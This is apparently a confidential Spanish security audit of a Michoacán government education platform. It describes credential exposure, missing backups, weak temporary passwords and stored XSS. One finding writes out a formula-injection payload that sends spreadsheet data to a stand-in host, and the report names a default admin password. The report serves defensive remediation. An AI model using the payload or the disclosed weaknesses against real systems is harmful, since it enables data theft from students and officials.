# Módula 22 — Hallazgos de auditoría
## Parte 1: estado actual, por capas

> Documento vivo. Se va llenando conforme terminan las auditorías.
> Última actualización: 2026-07-18.
>
> **Este documento describe debilidades de un sistema en producción.**
> Trátalo como confidencial: no publicar, no adjuntar a correos externos, no
> subir a repositorios públicos. Su lugar natural es el expediente del
> Documento de Seguridad (Art. 29 LGPDPPSO), con acceso restringido.

Severidades: **P0** acción inmediata · **P1** antes de migrar · **P2** durante
la migración · **P3** mejora continua.

---

## Capa: cadena de suministro y despliegue

Resumen: el código de aplicación está **mejor de lo típico**; los huecos reales
están concentrados en cómo se construye y se despliega, y en la higiene de
credenciales. Es una buena noticia — esa capa es la más barata de arreglar.

### P0-1 · Credenciales de producción en el equipo local, sin rotar

`.env` está correctamente ignorado y **nunca se commiteó** (verificado contra
todo el historial). Pero contiene credenciales **vivas de producción** en texto
plano en la laptop de trabajo:

| Variable | Riesgo si se filtra |
|---|---|
| `DATABASE_URL` | Acceso total a la base de producción (Neon) |
| `SESSION_SECRET` | **Forjar cookies de sesión: entrar como cualquier usuario, incluido admin** |
| `RESEND_API_KEY` | **Enviar correo con dominio de gobierno** |

La de Resend es la más grave y la menos obvia: permite mandar correo que llega
firmado como `@michoacan.gob.mx`. Eso no es "spam": es **phishing con identidad
gubernamental legítima**, contra los propios alumnos del padrón.

**Acción:** rotar las tres al migrar (la migración obliga a reemitirlas de todas
formas). A partir de ahí, que ningún equipo personal tenga credenciales de
producción — ver Capa 4 (AWS Secrets Manager).

### P0-2 · El script de semilla puede resetear contraseñas de admin en producción

`lib/db/src/seed.ts:1093` re-sincroniza, por idempotencia, las contraseñas de
usuarios **que ya existen** de vuelta a `demo1234`. Y `DATABASE_URL` apunta a
Neon **de producción**, no a una base local.

Consecuencia: un `pnpm --filter @workspace/db run seed` ejecutado por
distracción **deja la cuenta `admin@michoacan.gob.mx` con la contraseña
`demo1234`** — que además está publicada en `prepa-michoacan/README.md:99`.

No hace falta un atacante. Basta un despiste, y el sistema queda abierto de par
en par sin que nadie se entere.

**Acción (hoy):** guard de entorno en `seed.ts` que aborte si la cadena de
conexión no es local. Es un `if` de tres líneas contra un riesgo catastrófico.

### P0-3 · El contenedor no fija el lockfile

`Dockerfile:16`:

```
RUN pnpm install --no-frozen-lockfile --ignore-scripts && pnpm rebuild
```

Dos problemas en una línea:

1. `--no-frozen-lockfile` permite que el build **resuelva versiones distintas a
   las auditadas**. Lo que se probó no es necesariamente lo que se despliega.
2. `pnpm rebuild` (línea 17) vuelve a ejecutar los scripts de ciclo de vida que
   `--ignore-scripts` acababa de bloquear — anula buena parte de esa defensa.

Para una plataforma de gobierno, la reproducibilidad del build no es opcional:
es lo que permite afirmar qué código corre en producción.

### P1-4 · Despliegue sin ninguna puerta de calidad

`.github/workflows/deploy.yml` son 22 líneas: checkout → Railway CLI →
`railway up`. **Sin typecheck, sin pruebas, sin lint, sin escaneo de
dependencias.** Cualquier push a `main` llega a producción de gobierno sin
verificación alguna.

Con dos agentes trabajando en paralelo en este repo, eso es especialmente
frágil.

### P1-5 · El esquema se aplica solo en cada arranque

`Dockerfile:28` ejecuta `drizzle-kit push` en el `CMD`. Cada arranque o
reinicio aplica cambios de esquema **directamente contra producción**, sin
migración revisada ni posibilidad de rollback. Con `restartPolicyMaxRetries: 10`
(`railway.json:9`), puede repetirse en bucle.

Esto se agrava con lo que ya sabíamos: el arranque además corre
`sincronizarEstadosEtapas()` y `vencerPagosExamen()`, que **mutan datos**.

### P1-6 · El contenedor corre como root

`Dockerfile:1` — `FROM node:24-slim`, tag móvil sin digest, sin `USER node`,
single-stage (la imagen final incluye toolchain de build y devDependencies).

Positivo: `.dockerignore` sí excluye `.env` y `.git`, y el `COPY` es selectivo.

### P1-7 · Dependencias con vulnerabilidades conocidas

0 críticas, 15 altas, 13 moderadas sobre 736 dependencias. La mayoría de las
altas son de desarrollo. **En ruta de producción y alcanzables por petición
HTTP:**

| Paquete | Severidad | Vía |
|---|---|---|
| `path-to-regexp` | Alta | `express > router` |
| `qs` | Moderada (DoS) | `express` |
| `tar` ×6 | Alta | `pdfjs-dist > canvas > node-pre-gyp` |
| `tmp` | Alta | `exceljs` |

Todas con arreglo disponible. Vale evaluar si `canvas` es prescindible: es la
raíz de toda la cadena de `tar` y arrastra binarios nativos.

### P2-8 · CSP desactivada y límite de tasa parcial

`index.ts:59` — `helmet({ contentSecurityPolicy: false })`. El resto de helmet
(HSTS, nosniff, frameguard) sí está activo. La CSP es la defensa de fondo contra
XSS en un portal que muestra datos personales.

Límite de tasa: sólo cubre 3 rutas de autenticación y unos pocos endpoints
locales. **Sin límite global**, quedan expuestos al abuso `/api/admin/*`,
`/api/gestor/*`, `/api/estudiante/*` y **todas las subidas de archivos**.

### P2-9 · Árbol legacy con autenticación fail-open

`prepa-michoacan/api/middleware/auth.ts:14` usa un secreto por defecto
hardcodeado y legible en el repo. Con él se pueden **forjar cookies
`{rol:'admin'}`**.

Está mitigado porque el `Dockerfile` no copia esa carpeta — pero es una mina
esperando a que alguien la reviva. Borrar el árbol.

### Lo que está bien (y conviene no romper)

- `.env` ignorado y **cero secretos en todo el historial de git**
- Patrón *fail-closed* en `config/env.ts`: sin `SESSION_SECRET`/`QR_SECRET` el
  servidor no arranca en producción
- CORS con allowlist real, no reflejo del origen
- Cookies `httpOnly` + `secure` en producción
- Rutas `/api/dev` no montadas en producción
- El manejador de errores no filtra detalles internos en producción
- Límites de tamaño: `json` 2 MB, subidas 10 MB
- Uso disciplinado de `any` (25 en todo el API), **cero `@ts-ignore`**

---

## Orden de remediación de esta capa

| # | Acción | Cuándo |
|---|---|---|
| 1 | Guard de entorno en `seed.ts` | **Hoy** |
| 2 | Rotar `DATABASE_URL`, `SESSION_SECRET`, `RESEND_API_KEY` | Con la migración |
| 3 | `--frozen-lockfile`; revisar `pnpm rebuild` | Antes de migrar |
| 4 | Typecheck + `pnpm audit --prod` como puerta de despliegue | Antes de migrar |
| 5 | Sacar `drizzle-kit push` del arranque → migraciones versionadas | Con la migración |
| 6 | `USER node`, base por digest, multi-stage | Con la migración |
| 7 | Actualizar dependencias; evaluar `canvas` | Antes de migrar |
| 8 | Límite de tasa global + CSP | Iteración dedicada |
| 9 | Borrar `prepa-michoacan/` | Antes de migrar |

---

## Capa: continuidad, bitácoras y detección

Esta capa es la que está peor, y por mucho. Contiene el único hallazgo del que
no se puede volver.

### P0-10 · No existe ninguna estrategia de respaldo

Búsqueda exhaustiva de `backup|dump|restore|snapshot|pg_dump` en todo el repo:
**un único resultado, y es un comentario dentro de un script**.

- No hay script de respaldo, ni programado ni manual.
- No hay procedimiento de restauración. **No hay RTO ni RPO definidos.**
- **Nunca se ha probado restaurar.** Un respaldo no verificado no es un respaldo.
- Los **archivos** (expedientes, fotos, comprobantes) tampoco están respaldados.

La única red hoy es el PITR de Neon: es del proveedor, tiene ventana limitada
según el plan, y **desaparece el día de la migración** si no se reemplaza
explícitamente.

Con expedientes de valor legal de más de 20,000 personas al año, esto es el
riesgo número uno del sistema. Todo lo demás es recuperable; esto no.

> Detalle operativo que hoy es conocimiento tribal: `lib/db/verificar-secuencias.mjs`
> es **paso obligatorio después de restaurar**. Sin él, los folios de pago chocan
> contra `UNIQUE(folio)` y deja de emitirse cualquier ficha. No está en ningún runbook.

### P0-11 · El trabajo que borra cuentas corre a ciegas

`services/depuracion.ts:354`, programado a las **3:00 AM** (`index.ts:178`).
Ejecuta bajas de cuentas de alumnos. Y:

- **No es idempotente** y no tiene lock.
- Si falla, va a `console.error` y **nadie se entera**.
- No hay alertas de ningún tipo en todo el sistema.
- No hay respaldo del que recuperar (P0-10).

Es decir: el proceso más destructivo del sistema es también el menos observado,
corre a la hora en que nadie mira, y no hay red debajo. **Este riesgo existe hoy,
no depende de AWS.**

### P0-12 · La bitácora no registra ni accesos ni extracciones

Se auditan 44 acciones — el flujo administrativo del expediente está bien
cubierto. Pero faltan justo los tres ejes que un órgano fiscalizador pide primero:

| Falta | Dónde |
|---|---|
| **Inicio de sesión exitoso** | `routes/auth.ts:34-66` — sólo actualiza `ultimoLogin` |
| **Inicio de sesión fallido** | `routes/auth.ts:43-52` — dos `401` mudos |
| **Firma de cookie inválida** | `middleware/auth.ts:83-86` — **el indicador más fuerte de ataque activo, descartado en silencio** |
| **403 por rol no autorizado** | `middleware/auth.ts:97-100` — mudo |
| **Exportación de reportes** | `routes/reportes.ts` **no importa `tryAuditLog`** — se puede descargar un Excel con miles de alumnos sin dejar rastro |
| **Emisión de credenciales** | `admin.ts:4689`, `gestor.ts:1486`, `estudiante.ts:2484` |
| **Ciclo de pago de examen** | `pagos-examen.ts` no audita: emisión, pagado, vencimiento |
| **Lectura de expediente** | Abrir el expediente completo de un alumno no deja rastro |
| **Cambio de rol / `es_jefe`** | Sin acción de auditoría |

Traducción operativa: hoy **no se puede responder** a la pregunta "¿quién vio o
se llevó los datos de esta persona?". Esa pregunta llega tarde o temprano.

### P0-13 · La bitácora no es inmutable

No hay ruta de borrado en la app (bien), y la lectura está restringida a la
titular. Pero la aplicación usa **una sola credencial de base con permisos
plenos**: nada impide `DELETE FROM audit_log`. Sin `REVOKE`, sin triggers, sin
tabla append-only, sin encadenamiento de hash.

**Cualquiera con acceso al `DATABASE_URL` puede reescribir la bitácora completa
sin dejar evidencia.** Para un sistema de gobierno, eso le quita todo valor
probatorio — que es justamente para lo que existe.

Tampoco hay exportación (tope de 200 por página) ni política de retención.

### P1-14 · El sistema es ciego a los ataques

No hay registro de intentos fallidos, ni de 403, ni de cookies falsificadas. El
único control es el límite de tasa de 30/15min **por IP** en 3 rutas.

- Un atacante con 100 IPs prueba 3,000 contraseñas contra **la misma cuenta** sin
  activar nada: no hay bloqueo por cuenta ni contador de intentos fallidos.
- El almacén del limitador está **en memoria**: con N instancias el límite real
  es 30×N, y se reinicia en cada despliegue.

Con lo que existe hoy, **un ataque de fuerza bruta o una enumeración del padrón
serían indetectables**, en el momento y después.

### P1-15 · Cero alertas y observabilidad que miente al escalar

- **No hay ninguna alerta.** Ni correo ante 5xx sostenidos, ni caída de base. El
  tablero de salud es *pull*: alguien tiene que abrirlo.
- El logger estructurado (`src/lib/logger.ts`, pino con redacción de cabeceras)
  **existe y no lo importa nadie**. Todo es `console.log` sin request id.
- Las métricas viven en un `Map` en memoria del proceso: con N instancias, el
  tablero mostraría ~1/N del tráfico real y variaría en cada recarga. **Un
  tablero que miente es peor que no tenerlo.**
- `GET /api/health` devuelve `{ok:true}` **sin comprobar nada**: un balanceador
  mandaría tráfico a instancias con la base caída.

### P1-16 · Lo que se rompe al escalar a más de una instancia

Lista de bloqueo para la migración:

| # | Qué se rompe | Consecuencia |
|---|---|---|
| 1 | **Los 5 crons corren N veces** | Correos duplicados ×N; `correrDepuracion` en carrera consigo mismo |
| 2 | **Rutas absolutas de archivos en la BD** | Los expedientes fallan ~(N-1)/N de las veces |
| 3 | **Límite de tasa en memoria** | Protección anti-fuerza-bruta anulada |
| 4 | **Healthcheck que no comprueba nada** | Tráfico a instancias muertas |
| 5 | **Métricas en memoria** | Tablero engañoso |

Punto a favor: **las sesiones son stateless** (cookie HMAC), así que escalan sin
sticky sessions. Ojo con el reverso: no hay revocación real, y la tabla
`sesiones` que se borra al "cerrar todas las sesiones" **no participa en la
validación** — cerrar sesiones no cierra nada.

### P2-17 · Bug real de auditoría y de borrado de sesiones

`routes/configuracion.ts:52` — `reqUser(req)` lee `.id`, pero el objeto de sesión
sólo tiene `userId`. Consecuencias:

1. Todos los registros de auditoría por esa vía guardan `user_id` vacío.
2. Peor: `configuracion.ts:442` y `:449` ejecutan
   `db.delete(sesiones).where(eq(sesiones.userId, undefined))`.

### P2-18 · 29 `catch {}` vacíos

26 en `admin.ts`, 3 en `gestor.ts`, sin log ni comentario. Son 29 puntos donde
una notificación no enviada o un registro de auditoría perdido **desaparecen sin
rastro** mientras el sistema reporta éxito.

---

## Capa: identidad y acceso

### ✅ P0-19 · Bypass de verificación de correo — CORREGIDO 2026-07-18

`publico.ts:400` aceptaba el código fijo `111111` para **cualquier correo**, sin
candado de entorno, en producción. Permitía secuestrar el correo de un tercero y
auto-registrarse con sesión válida. Corregido en `4a935af`: el atajo sobrevive
sólo fuera de producción.

*Lección para el proceso, no para el código:* el comentario decía "QUITAR antes
de producción real" y se quedó. Un `TODO` no es un control. Ver la propuesta de
puerta de despliegue (P1-4): un `grep` de marcadores prohibidos en CI habría
cazado esto el día uno.

### P1-20 · La contraseña temporal de cada alumno nuevo son 5 dígitos

`utils/password.ts:26` — la contraseña que recibe **todo alumno dado de alta por
un gestor** (~1,700/mes) es un código de 5 dígitos: 100,000 combinaciones, y
**sin caducidad** hasta el primer inicio de sesión.

El único freno es el límite de 30 intentos/15 min **por IP**, sin bloqueo por
cuenta. Con varias IPs se agota el espacio en minutos. Y el correo del alumno es
deducible o consultable.

Contraste llamativo: para gestores sí se usa `generarPasswordTemporal`, con
entropía alfanumérica. Los alumnos —que son 1,700 al mes— tienen la política más
débil del sistema.

### P1-21 · Cambiar la contraseña no cierra las sesiones abiertas

La sesión es un HMAC sin estado, sin versión ni lista de revocación. Si alguien
roba la cookie y la víctima **hace lo correcto** (cambiar su contraseña), la
cookie robada **sigue sirviendo hasta 7 días**.

Es una vuelta de tuerca peor que el hueco ya conocido del usuario desactivado:
aquí la persona intenta protegerse y el sistema no se lo permite.

*Arreglo:* campo `passwordVersion` en `users`, incluido en el payload firmado y
comparado al validar. Se incrementa al cambiar contraseña y al desactivar. Cierra
P1-21 y R4 de una vez, sin consultar la base en cada petición.

### P2-22 · La política de contraseña más débil está en el punto por donde pasan todos

`estudiante.ts:551` — el cambio **obligatorio de primer inicio de sesión** exige
sólo 8 caracteres. Acepta `aaaaaaaa`. La política fuerte (mayúscula + número) está
en `auth.ts:117`, que es el cambio **opcional** desde el perfil.

O sea: la regla estricta se aplica donde casi nadie pasa, y la laxa donde pasan
los 1,700 al mes.

### P2-23 · El material del Plan 22 no respeta el candado de pago

`estudiante.ts:708` y `:829` — el listado de módulos comprueba `planDesbloqueado`,
pero el **detalle** y la **descarga de material** no. Cualquier cuenta de alumno,
recién creada y sin pagar, puede recorrer los módulos 1–22 y descargar los libros
oficiales.

No expone datos de terceros: es pérdida de control sobre el activo, no fuga de PII.

### P3-24 · Enumeración de usuarios por tiempo de respuesta

`auth.ts:43` — si el correo no existe responde de inmediato; si existe, primero
corre `bcrypt` (~80-100 ms). La diferencia permite deducir qué correos tienen
cuenta, pese al mensaje genérico. *Arreglo:* comparar siempre contra un hash
señuelo.

### Lo que está bien en esta capa (verificado extremo a extremo)

Esto merece constar, porque es el riesgo R1/R2 del modelo de amenazas y **salió
limpio**:

- **IDOR en gestor**: las 2,638 líneas de `gestor.ts` revisadas. Todas las rutas
  de alumno pasan por `verificarAlumnoDelGestor()` o filtran por `gestorId`. No
  se encontró una sola ruta que se salte el candado.
- **IDOR en estudiante**: todas las rutas usan `req.user.userId` como fuente de
  verdad; donde hay `:id` se compara contra el titular y se responde 403.
- **Pagos, calificaciones, aula, chat, banco, firma, notificaciones**: control de
  acceso centralizado y aplicado.
- **Ninguna ruta confía en el rol o el userId enviados por el cliente.**
- **Reseteo de contraseña**: token de 256 bits, guardado como hash, un solo uso,
  caduca en 1 hora, respuesta genérica. Bien hecho.
- **Verificación pública de credenciales**: `timingSafeEqual`, sin filtrar datos
  ante firma inválida, `no-store`, y sólo expone nombre y folio.
- `dev.ts` doblemente cerrado (entorno + rol) y no montado en producción.

**Lectura de conjunto:** el control de acceso *entre usuarios* —lo más difícil de
hacer bien y lo más caro de arreglar— está sólido. Los problemas están en los
bordes: un atajo de pruebas olvidado, entropía de contraseñas y ciclo de vida de
la sesión. Todos acotados y arreglables.

---

## Capa: archivos, datos personales e inyección

### 🔴 P0-25 · `EMAIL_MODE` es *fail-open* y filtra contraseñas

`services/email.ts:13` — `process.env.EMAIL_MODE ?? 'dev'`.

Si esa variable falta o se escribe mal en el entorno, producción **cae
silenciosamente en modo desarrollo**. Y en modo desarrollo, el sistema devuelve
**en el cuerpo de la respuesta JSON**:

- la contraseña temporal de cada alumno nuevo (`admin.ts:1021`, `:1139`, `:3662`;
  `gestor.ts:423`, `:1401`)
- el código de verificación de correo (`publico.ts:377`)

El contraste con el resto del sistema es la clave del hallazgo: `SESSION_SECRET`
y `QR_SECRET` son *fail-closed* — sin ellos el servidor **no arranca**.
`EMAIL_MODE` hace lo contrario, y su valor por defecto es justo el peligroso.

**Arreglo en dos partes:** (1) no revelar nunca secretos en la respuesta cuando
`NODE_ENV === 'production'`, **sin importar** `EMAIL_MODE` — red de seguridad que
no puede romper nada; (2) exigir `EMAIL_MODE` explícito en producción, como los
otros secretos.

### P1-26 · XSS almacenado contra el administrador, vía comprobante de pago

`pagos-examen.ts:79` sube **sin `fileFilter`**: acepta cualquier tipo. Y al
servir (`:233`, `:330`) fuerza `Content-Disposition: inline` sin declarar
`Content-Type`. Con la CSP desactivada (P2-8), el conjunto es explotable:

Un alumno o gestor sube como "comprobante" un HTML o SVG con script. Cuando el
administrador lo abre para revisarlo, **el código corre en la sesión del
administrador**. Desde ahí: aprobar pagos, leer el padrón, escalar.

El patrón correcto ya existe en el propio repo — `pagos.ts:237` filtra tipos y
fuerza descarga. Aquí se olvidó.

### P1-27 · La validación de tipo de archivo es falsificable en todo el sistema

Los ocho `fileFilter` del sistema validan **el `Content-Type` que declara el
cliente**, nunca los bytes reales. Cualquiera puede subir un HTML diciendo que
es un PDF.

Está parcialmente mitigado al servir (se re-deriva el tipo por extensión y se
fuerza descarga en expediente y pagos), pero P1-26 demuestra que esa mitigación
no está en todas partes. *Arreglo:* validar por *magic bytes* al recibir.

### P1-28 · Inyección de fórmulas en la hoja "Gráfica" de los reportes

`services/excelGenerator.ts:194`. La hoja "Datos Detallados" sí pasa cada celda
por `sanitizarCelda()`; la hoja "Gráfica" copia las mismas filas **sin
sanitizar**. El arreglo de 2026-06-19 quedó a medias.

El nombre del alumno es texto libre sin restricción de primer carácter. Alguien
se autoregistra como `=HYPERLINK("http://malo/roba?d="&A1,"ver")`, y cuando un
administrador exporta el reporte y lo abre en Excel, **la fórmula se ejecuta en
su equipo**. Es la vía clásica para saltar del servidor a la máquina del
funcionario.

### P1-29 · XSS almacenado de gestor a alumno, vía material del aula

`aula.ts:339` — `url: z.string().trim().max(1000)`, sin validar protocolo. Y el
portal lo pinta como `href` **sin pasar por `safeUrl()`**, a diferencia de los
anuncios, que sí lo hacen (`AlumnoAula.tsx:255`, `GestorAula.tsx:779`).

Un gestor publica un material con `url: "javascript:..."`. Al tocarlo el alumno,
se ejecuta código autenticado en el origen del portal. La cookie es `httpOnly`,
así que no hay robo directo de sesión, pero sí peticiones a la API **como el
alumno** y exfiltración de lo visible.

Mismo patrón, menor alcance, en `linkPago` (`pagos-examen.ts:794`, sólo admin
escribe, pero lo ven todos).

### P1-30 · El borrado ARCO no borra los archivos

`services/depuracion.ts:316` — el borrado definitivo elimina las filas de la base
(documentos, pagos, notificaciones, estudiante, usuario) pero **nunca llama a
`archivoEliminar()`**.

Resultado: después de ejecutar el flujo de cancelación que el propio código
documenta como derecho ARCO, **el acta de nacimiento, la CURP y la fotografía de
esa persona siguen almacenadas**. Con S3 —que es duradero— quedan ahí para
siempre.

Esto no es sólo una fuga: es **incumplimiento del derecho de cancelación**, con
el agravante de que el sistema registra en su bitácora que sí borró.

### P2-31 · Configuración sensible sin validación y con el rol equivocado

`routes/configuracion.ts` — `datos-bancarios`, `integraciones`,
`plantillas-correo` y `datos-institucionales` se escriben desde `req.body`
**sin esquema Zod**, sin límite de longitud. No es inyección (Drizzle
parametriza), pero permite llenado y errores de tipo.

Más relevante: están cerradas con `requireRol('admin')`, **no** con `soloJefe`.
Cualquier administrador operativo puede tocar **datos bancarios e
integraciones** (posibles secretos), cuando el modelo de roles dice que eso es
de la titular.

### P3-32 · Detalles menores

- `publico.ts:361` — el código de verificación usa `Math.random()`, no
  `crypto.randomInt()`.
- `storage.ts:84` — las subidas a S3 no declaran `ServerSideEncryption`: el
  cifrado depende del ajuste del bucket, sin red debajo en el código.
- `configuracion.ts:483` — única búsqueda que no pasa por `patronLike()`.
- La CURP se guarda en claro (inevitable por el índice único y la búsqueda). Es
  un **riesgo aceptado que debe quedar documentado** como tal en el Documento de
  Seguridad, no implícito.

### Lo que salió limpio (y es la mejor noticia del informe)

- **No hay IDOR en los documentos de identidad.** Se trazaron extremo a extremo
  todas las rutas que sirven archivos: alumno, gestor, admin, pagos,
  calificaciones y aula. Todas verifican pertenencia antes de servir. **La ruta
  R1 del modelo de amenazas —la catastrófica— está cerrada.**
- No hay SSRF: no existe un solo `fetch` saliente en el API.
- No hay path traversal: los nombres de archivo se sanean o se generan.
- No hay `eval`, `new Function`, `require` dinámico ni deserialización insegura.
- No hay *prototype pollution*: ningún merge recursivo sobre `req.body`.
- Los PDF se dibujan con `pdf-lib`, sin motor HTML → sin superficie de inyección.
- Todos los `sql.raw()` usan listas fijas de código o enteros ya validados.
- No se filtran hashes de contraseña ni tokens en ninguna respuesta.
